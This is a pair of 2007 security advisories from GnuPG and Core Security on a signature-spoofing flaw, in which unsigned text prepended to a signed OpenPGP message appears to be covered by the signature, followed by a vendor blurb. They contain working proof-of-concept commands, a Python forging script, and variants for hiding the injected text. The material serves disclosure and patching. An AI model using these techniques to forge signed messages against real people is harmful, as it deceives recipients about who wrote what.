             Multiple Messages Problem in GnuPG and GPGME
            ==============================================
                              2007-03-05

Summary
=======

Gerardo Richarte from Core Security Technologies identified a problem
when using GnuPG in streaming mode.

The problem is actually a variant of a well known problem in the way
signed material is presented in a MUA.  It is possible to insert
additional text before or after a signed (or signed and encrypted)
OpenPGP message and make the user believe that this additional text is
also covered by the signature.  The Core Security advisory describes
several variants of the attack; they all boil down to the fact that it
might not be possible to identify which part of a message is actually
signed if gpg is not used correctly.

[ Please do not send private mail in response to this message.  The
  mailing list gnupg-devel is the best place to discuss this problem
  (please subscribe first so you don't need moderator approval [1]). ]

Impact
======

All applications using GnuPG without properly using the status
interface to verify signed or signed and encrypted messages.

All GPGME versions up to and including 1.1.3.

Starting with version 1.4.7 and 2.0.3, GnuPG implements an additional
and sufficient protection against this common usage problem.

Detached signatures are in no way affected by this problem.

Description
===========

When using gpg (or gpg2) in a pipeline or with redirected input and
output additional data may be inserted into a message.  This allows to
forge a signed message by prefixing it with arbitrary material.  A way
to create such a message is:

  echo "This is my sneaky plaintext message" > foobar.txt
  gpg -z0 --output prefix.gpg --store foobar.txt
  cat prefix.gpg original-signed-message.gpg > forged.gpg

Using gpg naively this results in:

  $ gpg <forged.gpg
  This is my sneaky plaintext message
  Either I'm dead or my watch has stopped.
                  -- Groucho Marx's last words
  gpg: Signature made Mon Feb 26 09:57:04 2007 CET using DSA key ID 68697734
  gpg: Good signature from "Alfa Test (demo key) <[alfa at example.net](http://lists.gnupg.org/mailman/listinfo/gnupg-users)>"
  [...]

and thus gives the impression that the sneaky message is part of the
signed Groucho quote.  The correct way to use gpg with redirection is
by taking care of the status interface:

  $ gpg --status-fd 1 <forged.gpg
  [GNUPG:] PLAINTEXT 62 1172479053 foobar.txt
  [GNUPG:] PLAINTEXT_LENGTH 36
  This is my sneaky plaintext message
  [GNUPG:] PLAINTEXT 62 1172480224 original-signed-message
  [GNUPG:] PLAINTEXT_LENGTH 86
  Either I'm dead or my watch has stopped.
                  -- Groucho Marx's last words
  gpg: Signature made Mon Feb 26 09:57:04 2007 CET using DSA key ID 68697734
  [GNUPG:] SIG_ID UncMPBJYgbG/uszJVNKoCAz+hvY 2007-02-26 1172480224
  [GNUPG:] GOODSIG 2D727CC768697734 Alfa Test (demo key) <[alfa at example.net](http://lists.gnupg.org/mailman/listinfo/gnupg-users)>
  gpg: Good signature from "Alfa Test (demo key) <[alfa at example.net](http://lists.gnupg.org/mailman/listinfo/gnupg-users)>"
  [...]

Here the PLAINTEXT status lines clearly identify the start of a new
message.

Note, that using gpg on the command line is in almost all cases not
done with redirection but by letting gpg save the the signed message.
In this case gpg will save the message to different files or in case
the file names are identical, prompt the over to overwrite the first
one again.

Because the problem of identifying the actual signed content when
mixing the signed data and the signature is very common, the long
standing suggestion for all digital signatures is to use a detached
signature.  A detached signature allows to clearly identify what is
signed and what is the signature.  This is also the reason why
PGP/MIME signed messages are in general to be preferred over the old
style clear signed messages.

Solution
========

Given that there are many applications in use which are subject to the
described problem, we have decided to change GnuPG so that such forged
OpenPGP messages are detected and the signature verification will
fail.  GnuPG 1.4.7 has been released today and is available from the
usual places [2].  If you don't want to update, a minimal patch
against GnuPG 1.4.6 is available at

 ftp://ftp.gnupg.org/gcrypt/gnupg/patches/gnupg-1.4.6-multiple-message.patch

Many applications are using the library GPGME which implements an easy
way to process OpenPGP messages using gpg.  We have updated GPGME to
make it immune against this problem even if an old version of gpg is
being used.  GPGME 1.1.4 is available from the usual places [2].  A
patch (against version 1.1.3 or 1.1.2) is available at

 ftp://ftp.gnupg.org/gcrypt/gpgme/patches/gpgme-1.1.3-multiple-message.patch

Please note that - after applying one of these patches - some
vulnerable applications (mainly MUAs) may fail to handle certain
messages which are composed of several OpenPGP messages.  To continue
the support of such messages fixing the application is required as
there is no way for GnuPG to do it.

Support
=======

g10 Code GmbH [3], a Duesseldorf based company owned and headed by
GnuPG's principal author, is currently funding GnuPG development.
Support contracts or other financial backing will greatly help us to
improve the quality of GnuPG.

Thanks
======

Gerardo Richarte found this problem.  David Shaw greatly helped to
analyse and describe the core of the problem.

Release Mode: COORDINATED RELEASE
\*Vulnerability Description\*
Scripts and applications using GnuPG are prone to a vulnerability in how
signature verification information is shown to the end user.
An attacker is able to add arbitrary content to a signed message.
The receiver of the message (using a mail client such as Enigmail
to read the message) will not be able to distinguish the forged and the
properly signed parts of the message.
This problem derives from the fact that a valid OpenPGP message can
include multiple portions, each of them in turn considered a message but
some of which may or may not be signed and/or encrypted. Vulnerable third
party applications do not use the appropriate GnuPG API to determine
message boundaries and do not explicitly differentiate messages in their
output to end users.
In some cases, and depending on how GnuPG is used, even an advanced user
directly using GnuPG from the command line may be fooled by this attack.
It's important to note that this IS NOT a cryptographic problem, but
rather a problem on how information is shown to the user and how third-party
applications and GnuPG interact with each other.
\*Vulnerable Packages\*
GnuPG 1.4.6 and previous versions.
Enigmail 0.94.2 and previous versions.
KMail 1.9.5 and previous versions.
Evolution 2.8.1 and previous versions.
Sylpheed 2.2.7 and previous versions.
Mutt 1.5.13 and previous versions.
GNUMail 1.1.2 and previous versions.
Other scripts and applications using GnuPG may be vulnerable.
\*Solution/Vendor Information/Workaround\*
The following versions of GnuPG and GPGME resolve this issue:
GnuPG 1.4.7
GPGME 1.1.4
They can be downloaded from: http://www.gnupg.org/download/
The fixed versions enforce a limit of processing only one message on each
run so third party applications and direct GPG users can not be confused
by multiple messages with different security properties being intermingled
in the output without clear message boundaries.
For application developers using GnuPG as backend, it's a must to make the
application pay attention to the output of the "--status-fd" option.
Workaround:
If a signed message looks suspicious, the validity of the signature can
be verified manually by invoking GnuPG from the command line and adding
the special option "--status-fd", as described below, to gain extra
information.
\*Credits\*
This vulnerability was found by Gerardo Richarte from Core Security
Technologies.
\*Technical Description - Exploit/Concept Code\*
As explained by RFC2440, an OpenPGP message, as used by GnuPG, is composed
of several packets. A packet is a chunk of data that has a tag specifying
its meaning. An OpenPGP message consists of a number of packets. Some of
those packets may contain other OpenPGP packets.
The most common types are a plaintext packet inside a signature packet,
or a plaintext packet inside a signature packet inside an encrypted packet.
When two or more OpenPGP messages are concatenated together, a new
valid (and longer) message is obtained, and GnuPG handles it without
problem, processing packets and messages one after the other. Our
attack takes advantage of this feature of GnuPG. (It's actually a real
feature).
A standard signed-only message can be represented as:
Compressed (OnePassSignature + Literal(text) + Signature)
When the message is also encrypted, the session key, and an extra
encryption layer is added:
PubKeyEncrypted + EncryptedData( Compressed ( ... ) )
The message could be encrypted using symmetric crypto instead of public
key:
SimKeyEncrypted + EncryptedData( Compressed ( ... ) )
If the message is sent on email, or some other 7-bit medium, it may
be ASCII-armored by encoding it using base64 and then appending a
base64-encoded crc24 of the hole.
AsciiArmor(PubKeyEncrypted + EncryptedData( Compressed ( ... ) )
Our attack consists in prepending a literal packet before a normal
message, but inside the AsciiArmor if needed. We thought of several
variants for this attack, and some more can be easily generated.
There are four different ways to add text to a signed message, without
invalidating the signature.
\*Attack Variant 1: Prepending plaintext to an only-signed message.
This variant is the simplest, and consists on prepending a single Literal()
packet to an existing message, resulting in, for example:
Literal(bad\_text) + Compressed( OnePassSignature + Literal(text) +
Signature)
When GnuPG processes this message, it first outputs <bad\_text>, then
outputs <text> and then verifies what's enclosed between the
OnePassSignature and Signature packets, reporting that the signature is
correct (for <text>). When GnuPG is used through standard input and
standard output (as it is in most cases when it's used by other
applications such as MUAs), no distinction or separation is shown in
the output between the two texts, hence the application reading GnuPG's
output has no way to decide if the original input consisted of several
texts or just one correctly signed. And this is exactly the problem we
found.
Example:
- ----------------
gera@poxiran:~/gpg$ gpg -z9 --output signed.gpg --sign
You need a passphrase to unlock the secret key for
user: "Gerardo Richarte <gera (at) core-sdi (dot) com [email concealed]>"
1024-bit DSA key, ID 3944C2D0, created 1999-02-16
This text is signed, it's a simple text to use as an example.
gera@poxiran:~/gpg$ gpg -z0 --output forged.gpg --store
This text is inserted by the attacker
gera@poxiran:~/gpg$
gera@poxiran:~/gpg$ cat forged.gpg signed.gpg >hoax.gpg
gera@poxiran:~/gpg$ gpg <hoax.gpg
This text is inserted by the attacker
This text is signed, it's a simple text to use as an example.
gpg: Signature made Thu 22 Feb 2007 05:33:40 PM ART using DSA key ID 3944C2D0
gpg: Good signature from "Gerardo Richarte <gera (at) core-sdi (dot) com [email concealed]>"
Primary key fingerprint: A390 1BBA 2C58 D679 5A71 86F9 404F 4B53 3944 C2D0
- ----------------
We can inspect the structure of the message using --list-packets.
Although it doesn't show the nesting levels, it's a good help when
trying these things:
- ----------------
gera@poxiran:~/gpg$ gpg --list-packets <hoax.gpg
:literal data packet:
mode b (62), created 1172176500, name="",
raw data: 38 bytes
:compressed packet: algo=1
:onepass\_sig packet: keyid 404F4B533944C2D0

It's important to state here that GnuPG does offer an interface for
applications to obtain additional information when using it through
standard in and standard out, and this interface, when properly used, can
prevent the attack described here (see the description of "--status-fd" in
GnuPG documentation for more information). Using --status-fd is the
officially recommended way to use GnuPG from another application.
For example:
- ----------------
gera@poxiran:~/gpg$ gpg --status-fd 1 <hoax.gpg
[GNUPG:] PLAINTEXT 62 1172176500
[GNUPG:] PLAINTEXT\_LENGTH 38
This text is inserted by the attacker
[GNUPG:] PLAINTEXT 62 1172176306
[GNUPG:] PLAINTEXT\_LENGTH 97
This text is signed, it's a simple text to use as an example.

When GnuPG is used on files (vs. used through standard input and output),
the user will be asked if the output file can be overwritten, and only the
content of one Literal packet will be stored in the output file. If the
user chooses not to overwrite the file, and just presses Enter as answer
to the alternative file name, GnuPG's behaviour is not clear enough, and
the user may be fooled into believing the forged text is actually
correctly signed. However, the sole y/n question may be interpreted as
enough sign that something weird is going on:
- ----------------
gera@poxiran:~/gpg$ gpg hoax.gpg
File `hoax' exists. Overwrite? (y/N) n

\*Attack Variant 2: Prepending plaintext to a "clearsign" message
Clearsign messages are messages signed and encapsulated to be sent as an
email: the text of the message is not encoded in any way and can be read
without the help of GnuPG, and the signature is encoded using base64. If
you wanted to perform an attack on somebody, you would first need an
email signed by the victim, and then perform this attack on it.
We found two different ways of prepending a forged text to a clearsign
message. The first is simpler, but probably more visible to the victim.
The second is not so straightforward and clean, but may appear a little
bit less suspicious.
A description of the first way to prepend plaintext to a "clearsign"
message follows:
- ----------------
gera@poxiran:~/gpg$ gpg -z0 --store -a --output clear\_forged.txt
This text was inserted by the attacker!
gera@poxiran:~/gpg$ gpg --clearsign --output clear\_signed.txt

- ----------------
Although GnuPG behaves exactly like in Attack Variant 1 previously
described, some applications using it, like Enigmail, independently
detect the boundaries of GPG data by inspecting the message, and, in
Enigmail's case, for example, only process the first part of
clear\_hoax.txt, but don't process the signature part, making
Enigmail/GnuPG not vulnerable to this specific mode of attack. It may be
possible to fool Enigmail by using PGP/MIME, but our quick tests showed no
results.
We have not tested other applications like Kmail or Evolution with this
approach.
Note in the previous example that clear\_signed.txt is how a signed email
looks like. When performing our tests we found problems when copying the
clearsign text from an email, specially regarding CrLf conversions and
trimmed spaces at end of lines. We had to be very careful when extracting
the original signed text from the email.
For the second way to prepend a forged text to a "clearsign message" we
will first convert the clearsign message to a standard GnuPG signed
message, and then we'll do just the same we did in Attack Variant 1.
From a clearsign message, either created using --clearsign or cut&pasted
from an email, we need to extract the plaintext and the detached
signature, and then build a GnuPG message from it. The following python
script, although not perfect, will do just that (you'll need gpg.py [3] and
Impacket [2]):
- ---------------- clearsign2sign.py
#!/usr/bin/python
import os, gpg, sys, base64
clear\_sign = open(sys.argv[1], "rb").read().splitlines()
start = clear\_sign.index("-----BEGIN PGP SIGNED MESSAGE-----")
mid = clear\_sign.index("-----BEGIN PGP SIGNATURE-----")
end = clear\_sign.index("-----END PGP SIGNATURE-----")
text = 'rn'.join(clear\_sign[start+3:mid])
sign = 'n'.join(clear\_sign[mid+3:end-1])
onepass = gpg.OnePassSignature()
onepass['keyid'] = (0x12341234,0x12341234)
onepass['digest\_algo'] = 2
onepass['pubkey\_algo'] = 1
onepass['sigclass'] = 1
plain1 = gpg.Plaintext()
plain1['name'] = 'original'
plain1['data'] = text
plain1['mode'] = 0x62
signature = gpg.Raw()
signature['data'] = base64.decodestring(sign)
compressed = gpg.Compressed()
compressed['algorithm'] = gpg.COMPRESS\_ALGO\_ZLIB
compressed['data'] = [onepass, plain1, signature]
pkt = gpg.Packet()
pkt['version'] = 1
pkt['data'] = compressed
os.write(1,str(pkt))
- ----------------
This script will create a GnuPG message with the following structure:
Compress ( OnePassSignature + Literal + Signature )
To verify that the generated file is valid, we can pipe the output to gpg:
- ----------------
gera@poxiran:~/gpg$ ./clearsign2sign.py clear\_signed.txt |gpg
This text is in clear, and signed.
gpg: Signature made Fri 23 Feb 2007 06:23:40 PM ART using DSA key ID 3944C2D0

gera@poxiran:~/gpg$
- ----------------
The generated message can, again, be used as described in Attack Variant
1, concatenated to a forged plaintext, to perform an attack.
If you want to send this as an email, the easiest way is to compose an
email in your mail client, insert PGP/GPG header and footer, and paste a
base64 version of the concatenation of forged.gpg and the output from
clearsign2sign.py:
- ----------------
gera@poxiran:~/gpg$ ./clearsign2sign.py clear\_signed.txt >cleared.gpg
gera@poxiran:~/gpg$ cat forged.gpg cleared.gpg | uuencode -m . > hoax.b64
gera@poxiran:~/gpg$ cat hoax.b64
begin-base64 644 ,
yyxiAEXd/nRUaGlzIHRleHQgaXMgaW5zZXJ0ZWQgYnkgdGhlIGF0dGFja2Vy

/p3lC5bMX5O579Kxm+fkWEQfPGb7yzDPSvTKol/m67kNGjsSmd05t7TFl3oC
AFw8Lgo=
====
- ----------------
And this is how the final mail text should look like (first and last lines
of uudecode output's removed):
- -----BEGIN PGP MESSAGE-----
Version: GnuPG v1.4.3 (GNU/Linux)
yyxiAEXd/nRUaGlzIHRleHQgaXMgaW5zZXJ0ZWQgYnkgdGhlIGF0dGFja2Vy

/p3lC5bMX5O579Kxm+fkWEQfPGb7yzDPSvTKol/m67kNGjsSmd05t7TFl3oC
AFw8Lgo=
- -----END PGP MESSAGE-----
Although not necessarily needed for every use, strictly speaking, the crc24
is missing. If you want, you can use gpg.py to calculate it. Then you just
need to append it before the closing line:
- ----------------
gera@poxiran:~/gpg$ python
>>> import gpg
>>> print '='+gpg.crc24(open('forged.gpg').read() + open('cleared.gpg').read())
=BLll
- ----------------
In this example, you need to insert the string '=BLll' in a line before
the -----END PGP MESSAGE----- marker to obtain a complete message.
We've also confirmed that it's possible to perform the attack using PGP/MIME
to encode the email body as an HTML message, which hides the original text
using an open HTML comment. When PGP/MIME and HTML is used this way, the
attacker can fully replace the message the victim reads, while still
maintaining a valid signature, making the attack even more dangerous.
\*Attack Variant 3: Prepending plaintext to an encrypted and signed message.
So far we've concentrated on messages that were originally only signed, but
if the original message is also encrypted, the attack is still as easy to
perform as it is for only signed messages.
The structure of encrypted messages is quite similar for symmetrical
encrypted messages or those encrypted using a public key:
Symmetrical Encryption:
SymKeyEnc\_SesKey + Encrypted(OnePassSignature + Literal(text) + Signature)
Public Key Encryption:
PubKeyEnc\_SesKey + Encrypted(OnePassSignature + Literal(text) + Signature)
The difference is in the first packet, where SymKeyEnc\_SesKey is a packet
containing a session key encrypted using a symmetric cipher, and
PubKeyEnc\_SesKey contains the session key encrypted using a public key.
This is a simplified example, in the more common case the data inside
Encrypted() will be compressed.
It would be straightforward to perform the attack as described in Variant
1 to obtain:
Literal(bad\_text) + SymKeyEnc\_SesKey + Encrypted(OnePassSignature + ...)
or
Literal(bad\_text) + PubKeyEnc\_SesKey + Encrypted(OnePassSignature + ...)
and this would be enough to attack people using any of the
vulnerable GnuPG wrappers. But for people using GnuPG directly on the
command line, they will notice that a part of the message is printed before
asking the passphrase, and that another part is printed after asking
it, which may look suspicious. However, if needed, this behaviour can be
avoided by forcing GnuPG to ask the passphrase prior to processing any
Literal packet and outputting any text. Simply change the order of the
packets in forged message to look like:
SymKeyEnc\_SesKey + Literal(bad\_text) + Encrypted(OnePassSignature + ...)
or
PubKeyEnc\_SesKey + Literal(bad\_text) + Encrypted(OnePassSignature + ...)
With this GnuPG will ask the passphrase as soon as it sees the
\*KeyEnc\_SesKey packets, and will only decrypt the contents of the
Encrypted() packet, effectively outputting all text without interruption.
\*Attack Variant 4: Hiding the injected text from the naked eye
In all the previous variants the injected text is stored without any
encryption in the final message, and may be easily seen, probably making
the attack weaker. A very simple solution to this is to compress the
injected Literal packet, producing something like:
Compressed( Literal(bad\_text) ) + original\_message
or even
Compressed( Literal(bad\_text) + original\_message )
The same effect of hiding the injected text can be achieved using
encryption.
All this more advanced variants can be easily tried using gpg.py.
Another more advanced option would be to encrypt the injected text, but as
the encryption layer is never disabled, all the remaining data would have
to be encrypted as well. We have not tried this specific setting, but we
are pretty sure it must work.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
